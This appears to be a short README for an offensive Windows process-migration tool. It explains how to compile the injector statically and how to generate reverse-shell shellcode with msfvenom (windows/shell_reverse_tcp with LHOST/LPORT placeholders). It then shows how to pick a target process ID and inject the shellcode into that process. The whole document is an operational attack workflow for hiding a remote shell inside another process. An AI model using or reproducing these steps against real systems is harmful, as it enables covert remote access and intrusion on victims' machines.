# How-To migrate into a Windows Process

## Compile cpp file as a C++ project

Generate a static binary on Visual Studio:
1. Under Configuration Properties --> General, change the "Use of MFC" field to "Use MFC in a Static Library".
2. Under Configuration Properties --> C/C++ --> Code Generation, change the "Runtime Library" field to "Multi-Threaded (/MT)"

## Generate shellcode

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c
```

## Look for Process PID

```
C:\> tasklist /v
```

## Run

```
C:\> migrate.exe <PID>
```

## References

- https://resources.infosecinstitute.com/poor-mans-process-migration-windows/
- https://stackoverflow.com/questions/37398/how-do-i-make-a-fully-statically-linked-exe-with-visual-studio-express-2005
- https://superuser.com/questions/893372/how-can-i-see-which-user-accounts-are-running-which-processes-in-windows-8-1
